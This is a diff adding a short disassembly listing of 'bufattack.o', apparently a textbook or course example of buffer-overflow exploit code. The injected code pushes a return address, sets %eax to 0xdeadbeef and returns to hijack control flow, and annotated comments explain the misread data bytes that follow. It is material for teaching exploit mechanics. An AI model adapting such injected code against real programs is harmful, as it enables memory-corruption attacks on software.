@@ -1,0 +1,16 @@
+
+bufattack.o:     file format elf32-i386
+
+Disassembly of section .text:
+
+00000000 <.text>:
+/* $begin bufattack-d 7 */
+   0:	68 28 85 04 08       	push   $0x8048528
+   5:	b8 ef be ad de       	mov    $0xdeadbeef,%eax
+   a:	c3                   	ret    
+   b:	90                   	nop    # Byte inserted for alignment.    
+   c:	e8 ef ff bf bc       	call   0xbcc00000 # Invalid disassembly.
+  11:	ef                   	out    %eax,(%dx) # Trying to diassemble
+  12:	ff                   	(bad)  		  # data
+  13:	bf 00 00 00 00       	mov    $0x0,%edi
+/* $end bufattack-d 7 */
